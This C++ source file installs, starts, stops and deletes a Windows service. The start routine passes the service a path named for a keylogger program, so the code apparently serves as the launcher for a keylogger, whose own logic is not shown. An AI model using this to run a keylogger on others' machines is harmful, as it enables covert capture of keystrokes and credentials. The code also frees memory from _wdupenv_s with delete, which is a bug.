#include "Service.h"

int CreateTKService()
{
    tinky_g.ServiceHandle = CreateService(tinky_g.ServiceManager, SERVICE_NAME, SERVICE_NAME, SC_MANAGER_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, tinky_g.servicePath, NULL, NULL, NULL, NULL, 0);
    if (tinky_g.ServiceHandle == NULL)
    {
        printError("CreateService", GetLastError());
        CloseServiceHandle(tinky_g.ServiceManager);
        return 1;
    }

    std::cout << "Service {";
    std::wcout << SERVICE_NAME;
    std::cout << "} installed successfully.\n";

    CloseServiceHandle(tinky_g.ServiceHandle);
    CloseServiceHandle(tinky_g.ServiceManager);
    return (0);
}

int StartTKService()
{
    if (OpenServiceTinky())
        return 1;

	wchar_t buffer[MAX_PATH];
    wchar_t* envPath = nullptr;
    size_t len;

	_wgetcwd(buffer, MAX_PATH);
	std::wstring pathToKeylloger(buffer);
	pathToKeylloger += std::wstring(L"\\") + std::wstring(PROGAM_NAME);

    _wdupenv_s(&envPath, &len, L"LOCALAPPDATA");

    LPCWSTR args[] = { envPath, pathToKeylloger.c_str() };

    if (StartService(tinky_g.ServiceHandle, 2, args) == 0)
    {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_ALREADY_RUNNING)
            std::cout << "SERVICE ALREADY RUNNING (" << err << ")\n";
        else 
            printError("StartService", err);
        CloseServiceHandle(tinky_g.ServiceManager);
        return 1;
    }

    std::cout << "Service {";
    std::wcout << SERVICE_NAME;
    std::cout << "} started successfully.\n";

    CloseServiceHandle(tinky_g.ServiceHandle);
    CloseServiceHandle(tinky_g.ServiceManager);
    delete envPath;
    return (0);
}

int StopTKService()
{
    if (OpenServiceTinky())
        return 1;

    if (ControlService(tinky_g.ServiceHandle, SERVICE_CONTROL_STOP, &tinky_g.serviceStatus) == NULL)
    {
        printError("ControlService", GetLastError());
        CloseServiceHandle(tinky_g.ServiceManager);
        return 1;
    }

    std::cout << "Service {";
    std::wcout << SERVICE_NAME;
    std::cout << "} stopped successfully.\n";

    CloseServiceHandle(tinky_g.ServiceHandle);
    CloseServiceHandle(tinky_g.ServiceManager);
    return (0);
}

int DeleteTKService()
{
    if (OpenServiceTinky())
        return 1;

    killProcessByName(PROGAM_NAME);
    ControlService(tinky_g.ServiceHandle, SERVICE_CONTROL_STOP, &tinky_g.serviceStatus);

    if (DeleteService(tinky_g.ServiceHandle) == 0)
    {
        printError("DeleteService", GetLastError());
        CloseServiceHandle(tinky_g.ServiceManager);
        return 1;
    }
    
    std::cout << "Service {";
    std::wcout << SERVICE_NAME;
    std::cout << "} deleted successfully.\n";

    CloseServiceHandle(tinky_g.ServiceHandle);
    CloseServiceHandle(tinky_g.ServiceManager);
    return (0);
}